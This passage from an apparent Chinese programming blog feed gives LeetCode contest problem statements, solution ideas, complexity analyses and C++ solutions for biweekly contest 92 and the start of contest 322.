<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countSubarrays</span><span class="params">(vector&lt;<span class="type">int</span>&gt;&amp; nums, <span class="type">int</span> k)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> n = nums.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> idx = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] == k) &#123;</span><br><span class="line">                idx = i;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        unordered_map&lt;<span class="type">int</span>, <span class="type">int</span>&gt; cnt;</span><br><span class="line">        cnt[<span class="number">0</span>]++;</span><br><span class="line">        <span class="type">int</span> diff = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; k) &#123;</span><br><span class="line">                diff++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] &lt; k) &#123;</span><br><span class="line">                diff--;</span><br><span class="line">            &#125;</span><br><span class="line">            cnt[diff]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = idx; i &lt; n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; k) &#123;</span><br><span class="line">                diff++;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nums[i] &lt; k) &#123;</span><br><span class="line">                diff--;</span><br><span class="line">            &#125;            </span><br><span class="line">            res += cnt[diff] + cnt[diff - <span class="number">1</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  biweekly contest 92</title>
    <url>/2022/11/27/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/84/</url>
    <content><![CDATA[<h2 id="leetcode-biweekly-contest-92"><a href="#leetcode-biweekly-contest-92" class="headerlink" title="leetcode  biweekly contest 92"></a>leetcode  biweekly contest 92</h2><p>前三题确实是太简单了，最后一题稍微有点奥数的思想。</p>
<h3 id="6249-分割圆的最少切割次数"><a href="#6249-分割圆的最少切割次数" class="headerlink" title="6249. 分割圆的最少切割次数"></a>6249. 分割圆的最少切割次数</h3><p>圆内一个 <strong>有效切割</strong> ，符合以下二者之一：</p>
<ul>
<li>该切割是两个端点在圆上的线段，且该线段经过圆心。</li>
<li>该切割是一端在圆心另一端在圆上的线段。</li>
</ul>
<p>一些有效和无效的切割如下图所示。</p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/29/alldrawio.png" alt="img"></p>
<p>给你一个整数 <code>n</code> ，请你返回将圆切割成相等的 <code>n</code> 等分的 <strong>最少</strong> 切割次数。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/24/11drawio.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 4</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">上图展示了切割圆 2 次，得到四等分。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/10/24/22drawio.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：n = 3</span><br><span class="line">输出：3</span><br><span class="line">解释：</span><br><span class="line">最少需要切割 3 次，将圆切成三等分。</span><br><span class="line">少于 3 次切割无法将圆切成大小相等面积相同的 3 等分。</span><br><span class="line">同时可以观察到，第一次切割无法将圆切割开。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= n &lt;= 100</code></li>
</ul>
<h4 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-92/problems/minimum-cuts-to-divide-a-circle/">https://leetcode.cn/contest/biweekly-contest-92/problems/minimum-cuts-to-divide-a-circle/</a></p>
<h4 id="题意"><a href="#题意" class="headerlink" title="题意"></a>题意</h4><pre><code>数学
</code></pre>
<h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><ol>
<li>对称性的问题，如果 $n$ 能被 $2$ 整除，此时我们可以先从中切一次，将园等分为两部分，剩余的等分则刚好两遍半圆的等分次数相等即可，因此当 $n$ 为偶数时此时需要的最少此时为 $\dfrac{n}{2}$，否则为 $n$。特殊情况需要考虑，当 $n&#x3D; 1$时，此时不需要任何切分。</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(1)$。</li>
<li>空间复杂度：$O(1)$。</li>
</ul>
<h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">numberOfCuts</span><span class="params">(<span class="type">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (n == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (n % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> n / <span class="number">2</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> n;</span><br><span class="line">        &#125;        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6277-行和列中一和零的差值"><a href="#6277-行和列中一和零的差值" class="headerlink" title="6277. 行和列中一和零的差值"></a>6277. 行和列中一和零的差值</h3><p>给你一个下标从 <strong>0</strong> 开始的 <code>m x n</code> 二进制矩阵 <code>grid</code> 。</p>
<p>我们按照如下过程，定义一个下标从 <strong>0</strong> 开始的 <code>m x n</code> 差值矩阵 <code>diff</code> ：</p>
<ul>
<li>令第 <code>i</code> 行一的数目为 <code>onesRowi</code> 。</li>
<li>令第 <code>j</code> 列一的数目为 <code>onesColj</code> 。</li>
<li>令第 <code>i</code> 行零的数目为 <code>zerosRowi</code> 。</li>
<li>令第 <code>j</code> 列零的数目为 <code>zerosColj</code> 。</li>
<li><code>diff[i][j] = onesRowi + onesColj - zerosRowi - zerosColj</code></li>
</ul>
<p>请你返回差值矩阵 <code>diff</code> 。</p>
<p><strong>示例 1：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/11/06/image-20221106171729-5.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[0,1,1],[1,0,1],[0,0,1]]</span><br><span class="line">输出：[[0,0,4],[0,0,4],[-2,-2,2]]</span><br><span class="line">解释：</span><br><span class="line">- diff[0][0] = onesRow0 + onesCol0 - zerosRow0 - zerosCol0 = 2 + 1 - 1 - 2 = 0 </span><br><span class="line">- diff[0][1] = onesRow0 + onesCol1 - zerosRow0 - zerosCol1 = 2 + 1 - 1 - 2 = 0 </span><br><span class="line">- diff[0][2] = onesRow0 + onesCol2 - zerosRow0 - zerosCol2 = 2 + 3 - 1 - 0 = 4 </span><br><span class="line">- diff[1][0] = onesRow1 + onesCol0 - zerosRow1 - zerosCol0 = 2 + 1 - 1 - 2 = 0 </span><br><span class="line">- diff[1][1] = onesRow1 + onesCol1 - zerosRow1 - zerosCol1 = 2 + 1 - 1 - 2 = 0 </span><br><span class="line">- diff[1][2] = onesRow1 + onesCol2 - zerosRow1 - zerosCol2 = 2 + 3 - 1 - 0 = 4 </span><br><span class="line">- diff[2][0] = onesRow2 + onesCol0 - zerosRow2 - zerosCol0 = 1 + 1 - 2 - 2 = -2</span><br><span class="line">- diff[2][1] = onesRow2 + onesCol1 - zerosRow2 - zerosCol1 = 1 + 1 - 2 - 2 = -2</span><br><span class="line">- diff[2][2] = onesRow2 + onesCol2 - zerosRow2 - zerosCol2 = 1 + 3 - 2 - 0 = 2</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<p><img src="https://assets.leetcode.com/uploads/2022/11/06/image-20221106171747-6.png" alt="img"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：grid = [[1,1,1],[1,1,1]]</span><br><span class="line">输出：[[5,5,5],[5,5,5]]</span><br><span class="line">解释：</span><br><span class="line">- diff[0][0] = onesRow0 + onesCol0 - zerosRow0 - zerosCol0 = 3 + 2 - 0 - 0 = 5</span><br><span class="line">- diff[0][1] = onesRow0 + onesCol1 - zerosRow0 - zerosCol1 = 3 + 2 - 0 - 0 = 5</span><br><span class="line">- diff[0][2] = onesRow0 + onesCol2 - zerosRow0 - zerosCol2 = 3 + 2 - 0 - 0 = 5</span><br><span class="line">- diff[1][0] = onesRow1 + onesCol0 - zerosRow1 - zerosCol0 = 3 + 2 - 0 - 0 = 5</span><br><span class="line">- diff[1][1] = onesRow1 + onesCol1 - zerosRow1 - zerosCol1 = 3 + 2 - 0 - 0 = 5</span><br><span class="line">- diff[1][2] = onesRow1 + onesCol2 - zerosRow1 - zerosCol2 = 3 + 2 - 0 - 0 = 5</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>m == grid.length</code></li>
<li><code>n == grid[i].length</code></li>
<li><code>1 &lt;= m, n &lt;= 105</code></li>
<li><code>1 &lt;= m * n &lt;= 105</code></li>
<li><code>grid[i][j]</code> 要么是 <code>0</code> ，要么是 <code>1</code> 。</li>
</ul>
<h4 id="地址-1"><a href="#地址-1" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-92/problems/difference-between-ones-and-zeros-in-row-and-column/">https://leetcode.cn/contest/biweekly-contest-92/problems/difference-between-ones-and-zeros-in-row-and-column/</a></p>
<h4 id="题意-1"><a href="#题意-1" class="headerlink" title="题意"></a>题意</h4><pre><code>直接模拟
</code></pre>
<h4 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h4><ol>
<li>直接模拟即可，我们求出每一行与每一列中 $1$ 的个即可，然后按照题目要求进行模拟即可。<br>$$<br>res[i][j] &#x3D; 2 * onesRow[i] + 2 * onesCol[j] - m - n<br>$$</li>
<li>复杂度分析：</li>
</ol>
<ul>
<li>时间复杂度：$O(m\times n)$，其中 $m,n$ 为矩阵的行数与列数。</li>
<li>空间复杂度：$O(m +  n)$，其中 $m,n$ 为矩阵的行数与列数。</li>
</ul>
<h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">onesMinusZeros</span>(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt;&amp; grid) &#123;</span><br><span class="line">        <span class="type">int</span> m = grid.<span class="built_in">size</span>();</span><br><span class="line">        <span class="type">int</span> n = grid[<span class="number">0</span>].<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">onesRow</span><span class="params">(m)</span></span>;</span><br><span class="line">        <span class="function">vector&lt;<span class="type">int</span>&gt; <span class="title">onesCol</span><span class="params">(n)</span></span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                onesRow[i] += grid[i][j];</span><br><span class="line">                onesCol[j] += grid[i][j];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">res</span>(m, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(n, <span class="number">0</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; n; j++) &#123;</span><br><span class="line">                res[i][j] =  <span class="number">2</span> * onesRow[i] + <span class="number">2</span> * onesCol[j] - m - n;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>



<h3 id="6250-商店的最少代价"><a href="#6250-商店的最少代价" class="headerlink" title="6250. 商店的最少代价"></a>6250. 商店的最少代价</h3><p>给你一个顾客访问商店的日志，用一个下标从 <strong>0</strong> 开始且只包含字符 <code>&#39;N&#39;</code> 和 <code>&#39;Y&#39;</code> 的字符串 <code>customers</code> 表示：</p>
<ul>
<li>如果第 <code>i</code> 个字符是 <code>&#39;Y&#39;</code> ，它表示第 <code>i</code> 小时有顾客到达。</li>
<li>如果第 <code>i</code> 个字符是 <code>&#39;N&#39;</code> ，它表示第 <code>i</code> 小时没有顾客到达。</li>
</ul>
<p>如果商店在第 <code>j</code> 小时关门（<code>0 &lt;= j &lt;= n</code>），代价按如下方式计算：</p>
<ul>
<li>在开门期间，如果某一个小时没有顾客到达，代价增加 <code>1</code> 。</li>
<li>在关门期间，如果某一个小时有顾客到达，代价增加 <code>1</code> 。</li>
</ul>
<p>请你返回在确保代价 <strong>最小</strong> 的前提下，商店的 <strong>最早</strong> 关门时间。</p>
<p>注意，商店在第 <code>j</code> 小时关门表示在第 <code>j</code> 小时以及之后商店处于关门状态。</p>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：customers = &quot;YYNY&quot;</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">- 第 0 小时关门，总共 1+1+0+1 = 3 代价。</span><br><span class="line">- 第 1 小时关门，总共 0+1+0+1 = 2 代价。</span><br><span class="line">- 第 2 小时关门，总共 0+0+0+1 = 1 代价。</span><br><span class="line">- 第 3 小时关门，总共 0+0+1+1 = 2 代价。</span><br><span class="line">- 第 4 小时关门，总共 0+0+1+0 = 1 代价。</span><br><span class="line">在第 2 或第 4 小时关门代价都最小。由于第 2 小时更早，所以最优关门时间是 2 。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：customers = &quot;NNNNN&quot;</span><br><span class="line">输出：0</span><br><span class="line">解释：最优关门时间是 0 ，因为自始至终没有顾客到达。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：customers = &quot;YYYY&quot;</span><br><span class="line">输出：4</span><br><span class="line">解释：最优关门时间是 4 ，因为每一小时均有顾客到达。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= customers.length &lt;= 105</code></li>
<li><code>customers</code> 只包含字符 <code>&#39;Y&#39;</code> 和 <code>&#39;N&#39;</code> 。</li>
</ul>
<h4 id="地址-2"><a href="#地址-2" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-92/problems/minimum-penalty-for-a-shop/">https://leetcode.cn/contest/biweekly-contest-92/problems/minimum-penalty-for-a-shop/</a></p>
<h4 id="题意-2"><a href="#题意-2" class="headerlink" title="题意"></a>题意</h4><pre><code>滑动窗口
</code></pre>
<h4 id="思路-2"><a href="#思路-2" class="headerlink" title="思路"></a>思路</h4><ol>
<li>我们设商店营业到小时 $i$ 的开门代价为 $cost_1[i]$，我们设商店从小时 $i$ 开始关门的关门代价为 $cost_2[i]$。我们知道当商店从 $i$ 开始关门的总代价为 $cost[i] &#x3D; cost_1[i-1] + cost_2[i]$，我们找到最小的 $cost$ 即可，本质为一个前缀和的问题，可以将空间复杂度优化到 $O(1)$</li>
<li>复杂度分析</li>
</ol>
<ul>
<li>时间复杂度：时间复杂度为 $O(n)$，$n$ 数组的长度。</li>
<li>空间复杂度：空间复杂度为 $O(1)$ 。</li>
</ul>
<h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">bestClosingTime</span><span class="params">(string customers)</span> </span>&#123;</span><br><span class="line">        <span class="type">int</span> cost = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">auto</span> c : customers) &#123;</span><br><span class="line">            cost += c == <span class="string">&#x27;Y&#x27;</span> ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> minCost = cost;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; customers.<span class="built_in">size</span>(); i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (customers[i] == <span class="string">&#x27;N&#x27;</span>) &#123;</span><br><span class="line">                cost += <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                cost -= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (cost &lt; minCost) &#123;</span><br><span class="line">                res = i + <span class="number">1</span>;</span><br><span class="line">                cost = minCost;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<h3 id="6251-统计回文子序列数目"><a href="#6251-统计回文子序列数目" class="headerlink" title="6251. 统计回文子序列数目"></a>6251. 统计回文子序列数目</h3><p>给你数字字符串 <code>s</code> ，请你返回 <code>s</code> 中长度为 <code>5</code> 的 <strong>回文子序列</strong> 数目。由于答案可能很大，请你将答案对 <code>109 + 7</code> <strong>取余</strong> 后返回。</p>
<p><strong>提示：</strong></p>
<ul>
<li>如果一个字符串从前往后和从后往前读相同，那么它是 <strong>回文字符串</strong> 。</li>
<li>子序列是一个字符串中删除若干个字符后，不改变字符顺序，剩余字符构成的字符串。</li>
</ul>
<p><strong>示例 1：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;103301&quot;</span><br><span class="line">输出：2</span><br><span class="line">解释：</span><br><span class="line">总共有 6 长度为 5 的子序列：&quot;10330&quot; ，&quot;10331&quot; ，&quot;10301&quot; ，&quot;10301&quot; ，&quot;13301&quot; ，&quot;03301&quot; 。</span><br><span class="line">它们中有两个（都是 &quot;10301&quot;）是回文的。</span><br></pre></td></tr></table></figure>

<p><strong>示例 2：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;0000000&quot;</span><br><span class="line">输出：21</span><br><span class="line">解释：所有 21 个长度为 5 的子序列都是 &quot;00000&quot; ，都是回文的。</span><br></pre></td></tr></table></figure>

<p><strong>示例 3：</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">输入：s = &quot;9999900000&quot;</span><br><span class="line">输出：2</span><br><span class="line">解释：仅有的两个回文子序列是 &quot;99999&quot; 和 &quot;00000&quot; 。</span><br></pre></td></tr></table></figure>

<p><strong>提示：</strong></p>
<ul>
<li><code>1 &lt;= s.length &lt;= 104</code></li>
<li><code>s</code> 只包含数字字符。</li>
</ul>
<h4 id="地址-3"><a href="#地址-3" class="headerlink" title="地址"></a>地址</h4><p><a href="https://leetcode.cn/contest/biweekly-contest-92/problems/count-palindromic-subsequences/">https://leetcode.cn/contest/biweekly-contest-92/problems/count-palindromic-subsequences/</a></p>
<h4 id="题意-3"><a href="#题意-3" class="headerlink" title="题意"></a>题意</h4><blockquote>
<p> 动态规划</p>
</blockquote>
<h4 id="思路-3"><a href="#思路-3" class="headerlink" title="思路"></a>思路</h4><ol>
<li>典型的动态规划，重点在于题目的提示如下：</li>
</ol>
<ul>
<li>回文字符串的长度为 $5$;</li>
<li>字符串中只包含数字；</li>
<li>枚举每个字符作为回文字符串中心，则左右两遍的字符串的范围为 $\text{00}-\text{99}$，此时最多只有 $100$ 种可能，因此我们只需要统计以每个字符串左右两遍能构成字符串 $x, x \in [0,99]$ 的数目即可。此时我们可以利用动态规划:</li>
</ul>
<ol start="2">
<li>设 $dp_1[i][j]$ 表示前 $i$ 个字符中含有的字符 $j$ 的数目，$dp_2[i][a\times 10 + b]$ 表示前 $i$ 个字符中含有的形成的字符串 $\text{ab}$ 的数目，则此时我们可以得到递推公式:<br>$$<br>dp_1[i][j] &#x3D; dp_1[i-1][j] + 1 \quad if \quad nums[i] &#x3D; j \<br>dp_1[i][j] &#x3D; dp_1[i-1][j]  \quad if \quad nums[i] \neq j \<br>dp_2[i][a\times 10 + b] &#x3D; dp_2[i-1][a\times 10 + b] + dp_2[i-1][a] \quad if \quad nums[i] &#x3D; b \<br>dp_2[i][a\times 10 + b] &#x3D; dp_2[i-1][a\times 10 + b]\quad if \quad nums[i] \neq b \<br>$$</li>
</ol>
<p>非常容易理解的动态规划即可求的左右两遍构成字符串 $x$ 的数目，设 $l(i-1, x)$ 表示从 $i$ 的左边构成字符串 $x$ 的数目，设 $r(i-1, x)$ 表示从 $i$ 的右边边构成字符串 $x$ 的数目，则此时我们可以得到递推公式如下:<br>$$<br>tot &#x3D; \sum_{i&#x3D;2}^{n-3}\sum_{j &#x3D; 0}^{99}l(i-1,j) \times r(i+1,j)<br>$$<br>3. 复杂度分析：</p>
<ul>
<li>时间复杂度：$O(n \times |\Sigma|^2)$，其中 $n$ 表示给定的字符串的长度, $|\Sigma|$ 表示给定的字符集的大小，在这里字符集为数字，此时 $|\Sigma| &#x3D; 10$。</li>
<li>空间复杂度：$O(n \times |\Sigma|^2)$，其中 $n$ 表示给定的字符串的长度, $|\Sigma|$ 表示给定的字符集的大小，在这里字符集为数字，此时 $|\Sigma| &#x3D; 10$。</li>
</ul>
<h4 id="代码-3"><a href="#代码-3" class="headerlink" title="代码"></a>代码</h4><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="type">int</span> <span class="title">countPalindromes</span><span class="params">(string s)</span> </span>&#123;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> mod = <span class="number">1e9</span> + <span class="number">7</span>;</span><br><span class="line">        <span class="type">int</span> n = s.<span class="built_in">size</span>();</span><br><span class="line">        <span class="function">vector&lt;<span class="type">long</span> <span class="type">long</span>&gt; <span class="title">L1</span><span class="params">(<span class="number">10</span>)</span>, <span class="title">R1</span><span class="params">(<span class="number">10</span>)</span></span>;</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">L2</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(<span class="number">100</span>));</span><br><span class="line">        vector&lt;vector&lt;<span class="type">long</span> <span class="type">long</span>&gt;&gt; <span class="built_in">R2</span>(n + <span class="number">1</span>, <span class="built_in">vector</span>&lt;<span class="type">long</span> <span class="type">long</span>&gt;(<span class="number">100</span>));</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            L2[i + <span class="number">1</span>] = L2[i];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">                L2[i + <span class="number">1</span>][j * <span class="number">10</span> + s[i] - <span class="string">&#x27;0&#x27;</span>] = (L2[i + <span class="number">1</span>][j * <span class="number">10</span> + s[i] - <span class="string">&#x27;0&#x27;</span>] + L1[j]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">            L1[s[i] - <span class="string">&#x27;0&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = n - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">            R2[i] = R2[i + <span class="number">1</span>];</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= <span class="number">9</span>; j++) &#123;</span><br><span class="line">                R2[i][j * <span class="number">10</span> + s[i] - <span class="string">&#x27;0&#x27;</span>] = (R2[i][j * <span class="number">10</span> + s[i] - <span class="string">&#x27;0&#x27;</span>] + R1[j]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">            R1[s[i] - <span class="string">&#x27;0&#x27;</span>]++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">long</span> <span class="type">long</span> res = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">2</span>; i &lt;= n - <span class="number">3</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">100</span>; j++) &#123;</span><br><span class="line">                res = (res + L2[i][j] * R2[i + <span class="number">1</span>][j]) % mod;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>


<p>欢迎关注和打赏，感谢支持！</p>
<ul>
<li>关注我的博客: <a href="http://whistle-wind.com/">http://whistle-wind.com/</a></li>
<li>关注我的知乎：<a href="https://www.zhihu.com/people/da-hua-niu">https://www.zhihu.com/people/da-hua-niu</a></li>
<li>关注我的微信公众号: 公务程序猿<br><img src="https://raw.githubusercontent.com/mike-box/pic/main/202210080853104.png" alt="1"></li>
</ul>
]]></content>
      <categories>
        <category>力扣周赛</category>
      </categories>
      <tags>
        <tag>力扣周赛</tag>
      </tags>
  </entry>
  <entry>
    <title>leetcode  contest 322</title>
    <url>/2022/12/04/%E5%8A%9B%E6%89%A3%E5%91%A8%E8%B5%9B%E9%A2%98%E8%A7%A3/85/</url>
    <content><![CDATA[<h2 id="leetcode-contest-322"><a href="#leetcode-contest-322" class="headerlink" title="leetcode  contest 322"></a>leetcode  contest 322</h2><p>前三题都是常规题目，最后一题并没有用到太多复杂的算法，两个 <code>BFS</code> 即可搞定。</p>
<h3 id="6253-回环句"><a href="#6253-回环句" class="headerlink" title="6253. 回环句"></a>6253. 回环句</h3><p><strong>句子</strong> 是由单个空格分隔的一组单词，且不含前导或尾随空格。</p>
<ul>
<li>例如，<code>&quot;Hello World&quot;</code>、<code>&quot;HELLO&quot;</code>、<code>&quot;hello world hello world&quot;</code> 都是符合要求的句子。</li>
</ul>
<p>单词 <strong>仅</strong> 由大写和小写英文字母组成。且大写和小写字母会视作不同字符。</p>
<p>如果句子满足下述全部条件，则认为它是一个 <strong>回环句</strong> ：</p>
<ul>
<li>单词的最后一个字符和下一个单词的第一个字符相等。</li>
<li>最后一个单词的最后一个字符和第一个单词的第一个字符相等。</li>
</ul>
<p>例如，<code>&quot;leetcode exercises sound delightful&quot;</code>、<code>&quot;eetcode&quot;</code>、<code>&quot;leetcode eats soul&quot;</code> 都是回环句。然而，<code>&quot;Leetcode is cool&quot;</code>、<code>&quot;happy Leetcode&quot;</code>、<code>&quot;Leetcode&quot;</code> 和 <code>&quot;I like Leetcode&quot;</code> 都 <strong>不</strong> 是回环句。</p>
<p>给你一个字符串 <code>sentence</code> ，请你判断它是不是一个回环句。如果是，返回 <code>true</code> ；否则，返回 <code>false</code> 。</p>
<p><strong>示例 1：</strong></p>
